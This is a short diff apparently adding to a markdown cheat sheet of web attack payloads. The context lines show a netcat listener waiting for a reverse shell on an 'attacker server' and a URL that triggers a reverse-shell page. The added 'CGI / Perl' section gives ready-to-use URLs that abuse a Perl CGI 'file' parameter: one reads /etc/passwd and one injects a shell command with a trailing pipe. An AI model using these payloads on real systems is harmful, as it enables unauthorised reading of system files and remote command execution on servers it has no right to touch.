@@ -132,3 +132,10 @@ nc -nlvp 4444 at attacker server, then:
 
 [http://192.168.99.90:8080/?test=RevShell.cshtml](http://192.168.99.90:8080/?test=RevShell.cshtml)
 
+## CGI / Perl
+
+- /etc/passwd
+[http://127.0.0.1:8895/cgi-bin/index.pl?file=/etc/passwd](http://127.0.0.1:8895/cgi-bin/index.pl?file=/etc/passwd)
+
+- Outputs the current server folder:
+[http://127.0.0.1:8895/cgi-bin/index.pl?file=ls|](http://127.0.0.1:8895/cgi-bin/index.pl?file=ls|)
